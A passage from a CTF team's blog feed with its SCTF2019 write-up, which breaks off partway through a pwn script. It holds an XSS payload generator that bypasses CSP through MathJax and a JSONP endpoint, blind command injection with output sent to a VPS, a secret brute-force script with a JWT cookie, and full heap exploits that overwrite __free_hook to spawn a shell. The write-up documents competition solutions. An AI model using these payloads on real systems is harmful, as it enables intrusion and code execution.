<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>kn0ck&#39;s blog</title>
  
  <subtitle>一群CTF爱好者</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://kctf.github.io/"/>
  <updated>2019-07-06T07:15:07.269Z</updated>
  <id>http://kctf.github.io/</id>
  
  <author>
    <name>kn0ck Team</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>SCTF2019-WriteUp</title>
    <link href="http://kctf.github.io/2019/06/25/SCTF2019-WP/"/>
    <id>http://kctf.github.io/2019/06/25/SCTF2019-WP/</id>
    <published>2019-06-25T07:08:49.000Z</published>
    <updated>2019-07-06T07:15:07.269Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>感谢Syclover师傅们的题目。<br>比赛体验良好，最终国内第五名。<br>以下为我们的WP。</p></blockquote><a id="more"></a><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="math-is-fun1-amp-math-is-fun2"><a href="#math-is-fun1-amp-math-is-fun2" class="headerlink" title="math-is-fun1 &amp; math-is-fun2"></a>math-is-fun1 &amp; math-is-fun2</h3><p>XSS绕过CSP和DOMpurify，看样子hint给的通过数学公式这块下手。</p><p>首先看一下CSP：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: </span><br><span class="line">  font-src cdnjs.cloudflare.com &apos;self&apos;;    </span><br><span class="line">    script-src &apos;self&apos; &apos;nonce-3fna6ZTUPOk=&apos; &apos;strict-dynamic&apos; &apos;unsafe-eval&apos;;    </span><br><span class="line">    style-src &apos;self&apos; &apos;unsafe-inline&apos;;    </span><br><span class="line">    child-src &apos;none&apos;;    </span><br><span class="line">    object-src &apos;none&apos;; </span><br><span class="line">    base-uri &apos;self&apos; &apos;nonce-3fna6ZTUPOk=&apos;;    </span><br><span class="line">    connect-src &apos;self&apos;;    </span><br><span class="line">    sandbox allow-scripts allow-modals allow-same-origin;    </span><br><span class="line">    default-src &apos;self&apos;;</span><br></pre></td></tr></table></figure><p>可以发现js有nonce做验证，但是又采取了<code>strict-dynamic</code>,所以，便可以通过动态加载js来绕过nonce。</p><p>然后进一步对网站测试，发现以下漏洞隐患点：</p><blockquote><p>整理一下已知点：</p><ol><li>get传text，可以通过js覆盖textarea</li><li>get传name，会作为window.config的值 。 通过换行，进而<strong>可以修改任意**</strong>全局变量**</li><li>有一个jsonp接口。</li><li>应该需要从math这里找突破点。</li><li>应该还需要绕过DOMPurify。（貌似所有输入全调这个接口了）</li></ol></blockquote><p>然后进行猜测，应该是要<strong>通过2来修改MathJax的配置，从而加载任意js文件，此时引入jsonp来实现xss。</strong></p><p>尝试修改jax的根路径，但是该处修改在引入MathJax之前，导致Hub改不了。改Ajax的话，会额外添加一个AuthorConfig字段，貌似不生效、</p><p>如下payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=123%0aMathJax[&apos;Ajax&apos;]=&#123;&quot;config&quot;:&#123;&quot;root&quot;:&quot;http://47.110.128.101/5am3test&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><p>可以看到</p><p><img src="https://img.5am3.com/20190624156134810069567.jpg" alt="20190624156134810069567.jpg"></p><p>此时在这个AuthorConfig卡了许久，查阅资料也没找到啥。最终无奈之下，找源头，翻了一下MathJax的源码，对AuthorConfig进行搜索，找到以下点，然后顿时思路清晰，构造payload即可。</p><p><img src="https://img.5am3.com/20190624156134827062364.png" alt="20190624156134827062364.png"></p><p>最后利用时，发现jsonp接口还有个waf，对引号进行了过滤，此时用eval+fromCharCode绕过即可，最终poc如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getPayload</span><span class="params">(evaljs)</span>:</span></span><br><span class="line">p = <span class="string">"http://47.110.128.101/config?callback="</span></span><br><span class="line">payload=<span class="string">'eval(String.fromCharCode('</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(evaljs)):</span><br><span class="line">payload+=str(ord(evaljs[i]))</span><br><span class="line"><span class="keyword">if</span>(i+<span class="number">1</span>&lt;len(evaljs)):</span><br><span class="line">payload+=<span class="string">','</span></span><br><span class="line">payload+=<span class="string">'));//'</span></span><br><span class="line">payload+=<span class="string">""</span></span><br><span class="line">test = <span class="string">"http://47.110.128.101/challenge?name=abcd%0aMathJax[%27root%27]%3d"</span></span><br><span class="line">payload = test+p+payload+<span class="string">"%26/"</span></span><br><span class="line">print(<span class="string">"[payload] "</span>+payload)</span><br><span class="line"><span class="keyword">return</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">arg = sys.argv[<span class="number">2</span>]</span><br><span class="line">getPayload(arg)</span><br></pre></td></tr></table></figure><p>第二题依旧一样，通杀的payload。</p><h3 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a>easyweb</h3><p>login登入由js进行校验，所以登入主要从js下手，配置一下burpsuite的抓包规则</p><p><img src="https://img.5am3.com/20190624156134842162539.png" alt="20190624156134842162539.png"></p><p>抓取访问<a href="USER_CANCEL">https://sctf2019.l0ca1.xyz/#/</a>main 交互的response返回包，修改response里面的requreiLogin的值为0，也就是修改为不需要登录直接进后台</p><p><img src="https://img.5am3.com/20190624156134843859268.png" alt="20190624156134843859268.png"></p><p>进入后台后是一个JSON打包的点，思路也就是通过构造JSON数据，在打包过程中触发命令执行</p><p><img src="https://img.5am3.com/20190624156134845186761.png" alt="20190624156134845186761.png"></p><p>随便填些数据进行测试，抓取数据包分析一下</p><p><img src="https://img.5am3.com/20190624156134846221741.png" alt="20190624156134846221741.png"></p><p>可以发现有给一个key：abcdefghiklmn123，应该是一个校验位，放那就好了，主要是构造npm的数据，思路是进行命令执行，所以可以构造出一个命令执行语句，命令执行没有回显，可以通过vps的log获取数据进行回显，构造命令注入的payload</p><p><img src="https://img.5am3.com/20190624156134848622476.png" alt="20190624156134848622476.png"></p><p>可以在vps上获取到asound.conf的数据信息</p><p><img src="https://img.5am3.com/20190624156134850099282.png" alt="20190624156134850099282.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line"># Place your global alsa-lib configuration here...</span><br><span class="line">#</span><br><span class="line"></span><br><span class="line">@hooks [</span><br><span class="line">&#123;</span><br><span class="line">func load</span><br><span class="line">files [</span><br><span class="line">&quot;/etc/alsa/pulse-default.conf&quot;</span><br><span class="line">]</span><br><span class="line">errors false</span><br><span class="line">&#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>本以为命令注入就解出来了，万万没想到怎么都没找到flag，也就是说还有一层考点……</p><p>查阅资料找到：<a href="https://www.anquanke.com/post/id/170596" target="_blank" rel="noopener">https://www.anquanke.com/post/id/170596</a></p><p>serveless执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST -H <span class="string">"Content-Type: application/json"</span> https://us-east1-slsbot-214001.cloudfunctions.net/gcp-py-explore --data <span class="string">'&#123;"ls":"./"&#125;'</span> | base64 --decode</span><br></pre></td></tr></table></figure><p>可以列出云上的一些文件,依然还没有找到flag。</p><p>于是本地装一下awscli 配下token看看吧</p><p><a href="https://www.anquanke.com/post/id/170342" target="_blank" rel="noopener">https://www.anquanke.com/post/id/170342</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws s3 cp s3://static.l0ca1.xyz/flaaaaaaaaag/flaaaag.txt ./flag.txt --region ap-northeast-1</span><br></pre></td></tr></table></figure><h3 id="Flag-Shop"><a href="#Flag-Shop" class="headerlink" title="Flag Shop"></a>Flag Shop</h3><p>通过 <a href="http://47.110.15.101/robots.txt" target="_blank" rel="noopener">http://47.110.15.101/robots.txt</a> 得到 <a href="http://47.110.15.101//filebak" target="_blank" rel="noopener">http://47.110.15.101//filebak</a>  进一步得到源码</p><p>分析源码，发现隐患点(没个卵用，还非要写上)</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unless</span> params[<span class="symbol">:SECRET</span>].<span class="literal">nil</span>?</span><br><span class="line">  puts <span class="string">"[ma1] "</span>+<span class="string">"<span class="subst">#&#123;params[<span class="symbol">:SECRET</span>].match(<span class="regexp">/[0-9a-z]+/</span>)&#125;</span>"</span></span><br><span class="line">  <span class="keyword">if</span> secret.match(<span class="string">"<span class="subst">#&#123;params[<span class="symbol">:SECRET</span>].match(<span class="regexp">/[0-9a-z]+/</span>)&#125;</span>"</span>)</span><br><span class="line">    puts <span class="string">"[flag] "</span>+flag</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>猜测是通过某种缺陷，来对secret进行盲注，进而读取secret，伪造 token，getflag？ </p><p> 核心的代码是上面这里， 但如何才能构造盲注？</p><p>一开始怀疑是正则的效率问题，但是此接口仅允许get方式，对url长度有限制。</p><p>最终查阅资料可以发现ruby有几个全局变量。其中$&amp;表示最近一次与正则表达式匹配的字符串。此时搭配之前一直很迷的SECRET，便可以爆破SECRET，脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://47.110.15.101/work?name=%3C%25%3d$%26%25%3E&amp;do=%3C%25%3d$%26%25%3E+is+working&amp;SECRET=&#123;SECRET&#125;"</span></span><br><span class="line"></span><br><span class="line">SECRET =<span class="string">"ec55ce17b51f7f2588b3d2f09c821e6499984b09810e652ce9fa4882fe4875c8"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">"Cookie"</span>: <span class="string">"auth=eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOiJhMDc4ZDU3ZC0wZjZmLTRhNTItODE1MC0yMGYyOTkzYzkxMTUiLCJqa2wiOjI4fQ.gQnZDaa3pKpldiD07vWsX65SO4Ioz5ZawOy5xJPNSEU;"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">zidian=<span class="string">"1234567890qwertyuiopasdfghjklzxcvbnm"</span></span><br><span class="line"><span class="keyword">for</span> jj <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> zidian:</span><br><span class="line">test = SECRET + i</span><br><span class="line"><span class="comment"># test = i + SECRET</span></span><br><span class="line">crackUrl = url.replace(<span class="string">"&#123;SECRET&#125;"</span>,test)</span><br><span class="line">text = requests.get(crackUrl,headers=headers).text</span><br><span class="line"><span class="keyword">if</span>(<span class="string">"'"</span>+test+<span class="string">" "</span> <span class="keyword">in</span> text):</span><br><span class="line">SECRET = test</span><br><span class="line">print(<span class="string">"[SECRET] "</span> + SECRET)</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>然后直接伪造jwt就可以了，有了key直接去那个神奇的网站就行了。最终在cookie中读出flag</p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="one-heap"><a href="#one-heap" class="headerlink" title="one_heap"></a>one_heap</h3><p>漏洞点free后指针未清0</p><p>首先爆破heap地址，攻击tcache。然后在tcache上爆破stdout地址用来泄露libc。最后将free hook改成system</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PwnContext <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    context.terminal = [<span class="string">'tmux'</span>, <span class="string">'split'</span>, <span class="string">'-h'</span>]</span><br><span class="line">    <span class="comment">#-----function for quick script-----#</span></span><br><span class="line">    s       = <span class="keyword">lambda</span> data               :ctx.send(str(data))        <span class="comment">#in case that data is a int</span></span><br><span class="line">    sa      = <span class="keyword">lambda</span> delim,data         :ctx.sendafter(str(delim), str(data)) </span><br><span class="line">    st      = <span class="keyword">lambda</span> delim,data         :ctx.sendthen(str(delim), str(data)) </span><br><span class="line">    sl      = <span class="keyword">lambda</span> data               :ctx.sendline(str(data)) </span><br><span class="line">    sla     = <span class="keyword">lambda</span> delim,data         :ctx.sendlineafter(str(delim), str(data))</span><br><span class="line">    r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :ctx.recv(numb)</span><br><span class="line">    ru      = <span class="keyword">lambda</span> delims, drop=<span class="keyword">True</span>  :ctx.recvuntil(delims, drop)</span><br><span class="line">    irt     = <span class="keyword">lambda</span>                    :ctx.interactive()</span><br><span class="line">    </span><br><span class="line">    rs      = <span class="keyword">lambda</span> *args, **kwargs    :ctx.start(*args, **kwargs)</span><br><span class="line">    leak    = <span class="keyword">lambda</span> address, count=<span class="number">0</span>   :ctx.leak(address, count)</span><br><span class="line">    </span><br><span class="line">    uu32    = <span class="keyword">lambda</span> data   :u32(data.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">    uu64    = <span class="keyword">lambda</span> data   :u64(data.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line"></span><br><span class="line">    debugg = <span class="number">0</span></span><br><span class="line">    logg = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    ctx.binary = <span class="string">'./one_heap'</span></span><br><span class="line"></span><br><span class="line">    ctx.symbols = &#123;<span class="string">'ptr'</span>:<span class="number">0x202050</span>&#125;</span><br><span class="line">    <span class="comment">#ctx.custom_lib_dir = '/glibc/x64/2.26/lib/'</span></span><br><span class="line">    <span class="comment">#ctx.debug_remote_libc = True</span></span><br><span class="line">    <span class="comment">#ctx.debug()</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> debugg:</span><br><span class="line">                rs()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                ctx.remote = (<span class="string">'47.104.89.129'</span>, <span class="number">10001</span>)</span><br><span class="line">                rs(method = <span class="string">'remote'</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> logg:</span><br><span class="line">                context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">(num)</span>:</span></span><br><span class="line">                sla(<span class="string">'choice:'</span>,num)</span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(asize,acon)</span>:</span></span><br><span class="line">                choice(<span class="number">1</span>)</span><br><span class="line">                sla(<span class="string">'size:'</span>,asize)</span><br><span class="line">                <span class="keyword">if</span> len(acon) &lt; asize:</span><br><span class="line">                    sla(<span class="string">'content:'</span>,acon)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    sa(<span class="string">'content:'</span>,acon)</span><br><span class="line">            <span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">()</span>:</span></span><br><span class="line">                choice(<span class="number">2</span>)</span><br><span class="line">            </span><br><span class="line">            add(<span class="number">0x70</span>,<span class="string">'AAA'</span>)</span><br><span class="line">            free()</span><br><span class="line">            free()</span><br><span class="line">            <span class="keyword">if</span> debugg:</span><br><span class="line">                <span class="keyword">if</span> p64(ctx.bases.heap)[<span class="number">1</span>] != <span class="string">'\x70'</span>:</span><br><span class="line">                    <span class="keyword">print</span> hex(ctx.bases.heap)</span><br><span class="line">                    ctx.close()</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">            </span><br><span class="line">            add(<span class="number">0x70</span>,p16(<span class="number">0x7010</span>))</span><br><span class="line">            add(<span class="number">0x70</span>,<span class="string">''</span>)</span><br><span class="line">            add(<span class="number">0x70</span>,p64(<span class="number">0</span>)*<span class="number">4</span>+<span class="string">'\x00'</span>*<span class="number">3</span>+<span class="string">'\x07'</span>)</span><br><span class="line">            free()</span><br><span class="line">            <span class="comment">#0x7ffff7dd0780</span></span><br><span class="line">            <span class="comment">#add(0x40,'\x00'*2+'\x07'+'\x00'*3+'\x07'+'\x00')</span></span><br><span class="line">            add(<span class="number">0x40</span>,<span class="string">'\x00'</span>)</span><br><span class="line">            fake = <span class="number">0xb770</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> debugg:</span><br><span class="line">                <span class="keyword">if</span> p64(ctx.bases.libc+<span class="number">0x3ec760</span>+<span class="number">0x10</span>)[:<span class="number">2</span>]!=<span class="string">'\x70\xb7'</span>:</span><br><span class="line">                    ctx.close()</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            add(<span class="number">0x10</span>,p64(<span class="number">0</span>)+p32(fake)[:<span class="number">2</span>])</span><br><span class="line">            free()</span><br><span class="line">            add(<span class="number">0x50</span>,p32(fake+<span class="number">0x10</span>)[:<span class="number">2</span>])</span><br><span class="line">            <span class="comment">#ctx.debug()</span></span><br><span class="line">            the_bytes = <span class="string">'\x70'</span></span><br><span class="line">            add(<span class="number">0x40</span>,the_bytes)</span><br><span class="line">            sl(<span class="number">1</span>)</span><br><span class="line">            sleep(<span class="number">0.1</span>)</span><br><span class="line">            sl(<span class="number">0x70</span>)</span><br><span class="line">            sleep(<span class="number">0.1</span>)</span><br><span class="line">            sl(the_bytes)</span><br><span class="line">            <span class="comment">#ctx.debug()</span></span><br><span class="line">            libc_base = uu64(r(<span class="number">6</span>)) - <span class="number">0x3ec770</span></span><br><span class="line">            log.success(<span class="string">"libc_base = %s"</span>%hex(libc_base))</span><br><span class="line">            libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">            save_text_base = libc_base + <span class="number">0x61a170</span></span><br><span class="line">            malloc_hook = libc_base + libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">            free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">            system = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">            stdout = libc_base + <span class="number">0x3ec760</span></span><br><span class="line">            </span><br><span class="line">            add(<span class="number">0x18</span>,p64(malloc_hook<span class="number">-8</span>)+p64(free_hook)+p64(stdout+<span class="number">0x10</span>))</span><br><span class="line">            add(<span class="number">0x50</span>,p64(save_text_base)+p64(libc_base+<span class="number">0x3ec7e3</span>)+p64(save_text_base)+p64(save_text_base+<span class="number">6</span>))</span><br><span class="line">            text_base = uu64(r(<span class="number">6</span>))</span><br><span class="line">            log.success(<span class="string">"text_base = %s"</span>%hex(text_base))</span><br><span class="line">            to_call_free = text_base + <span class="number">0xDAE</span></span><br><span class="line">            add(<span class="number">0x40</span>,p64(system+<span class="number">27</span>))</span><br><span class="line">            add(<span class="number">0x30</span>,<span class="string">'/bin/sh\x00'</span>+p64(to_call_free))</span><br><span class="line">            <span class="comment">#ctx.debug()</span></span><br><span class="line">            <span class="string">"""</span></span><br><span class="line"><span class="string">            add(0x18,p64(malloc_hook))</span></span><br><span class="line"><span class="string">            one = libc_base + 0x4f2c5</span></span><br><span class="line"><span class="string">            log.success("one = %s"%hex(one))</span></span><br><span class="line"><span class="string">            add(0x30,p64(one))</span></span><br><span class="line"><span class="string">            """</span></span><br><span class="line">            choice(<span class="number">1</span>)</span><br><span class="line">            sla(<span class="string">'size:'</span>,<span class="number">1</span>)</span><br><span class="line">            <span class="comment">#ctx.debug()</span></span><br><span class="line">            irt()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">            exit()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">if</span> ctx.io:</span><br><span class="line">                ctx.close()</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h3 id="two-heap"><a href="#two-heap" class="headerlink" title="two_heap"></a>two_heap</h3><p>漏洞点free后指针未清0</p><p>%a%a%a%a%a 双精度16字节可以泄露libc，然后利用0x20大小的chunk可以分配四个来攻击free hook即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PwnContext <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    context.terminal = [<span class="string">'tmux'</span>, <span class="string">'split'</span>, <span class="string">'-h'</span>]</span><br><span class="line">    <span class="comment">#-----function for quick script-----#</span></span><br><span class="line">    s       = <span class="keyword">lambda</span> data               :ctx.send(str(data))        <span class="comment">#in case that data is a int</span></span><br><span class="line">    sa      = <span class="keyword">lambda</span> delim,data         :ctx.sendafter(str(delim), str(data)) </span><br><span class="line">    st      = <span class="keyword">lambda</span> delim,data         :ctx.sendthen(str(delim), str(data)) </span><br><span class="line">    sl      = <span class="keyword">lambda</span> data               :ctx.sendline(str(data)) </span><br><span class="line">    sla     = <span class="keyword">lambda</span> delim,data         :ctx.sendlineafter(str(delim), str(data))</span><br><span class="line">    r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :ctx.recv(numb)</span><br><span class="line">    ru      = <span class="keyword">lambda</span> delims, drop=<span class="keyword">True</span>  :ctx.recvuntil(delims, drop)</span><br><span class="line">    irt     = <span class="keyword">lambda</span>                    :ctx.interactive()</span><br><span class="line">    </span><br><span class="line">    rs      = <span class="keyword">lambda</span> *args, **kwargs    :ctx.start(*args, **kwargs)</span><br><span class="line">    leak    = <span class="keyword">lambda</span> address, count=<span class="number">0</span>   :ctx.leak(address, count)</span><br><span class="line">    </span><br><span class="line">    uu32    = <span class="keyword">lambda</span> data   :u32(data.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">    uu64    = <span class="keyword">lambda</span> data   :u64(data.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line"></span><br><span class="line">    debugg = <span class="number">0</span></span><br><span class="line">    logg = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    ctx.binary = <span class="string">'./two_heap'</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#if debugg:</span></span><br><span class="line">    <span class="comment">#ctx.custom_lib_dir = '/glibc/x64/2.26/lib/'</span></span><br><span class="line">    <span class="comment">#else:</span></span><br><span class="line">    <span class="comment">#ctx.custom_lib_dir = '/glibc/x64/2.26/lib/'#remote libc</span></span><br><span class="line">    ctx.remote_libc = <span class="string">'./libc-2.26.so'</span></span><br><span class="line">    ctx.debug_remote_libc = <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ctx.symbols = &#123;<span class="string">'heap'</span>:<span class="number">0x4020</span>&#125;</span><br><span class="line">    <span class="comment">#ctx.breakpoints = [0x1234, 0x5678]</span></span><br><span class="line">    <span class="comment">#ctx.debug()</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debugg:</span><br><span class="line">        rs()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ctx.remote = (<span class="string">'47.104.89.129'</span>, <span class="number">10002</span>)</span><br><span class="line">        rs(method = <span class="string">'remote'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> logg:</span><br><span class="line">        context.log_level = <span class="string">'debug'</span></span><br><span 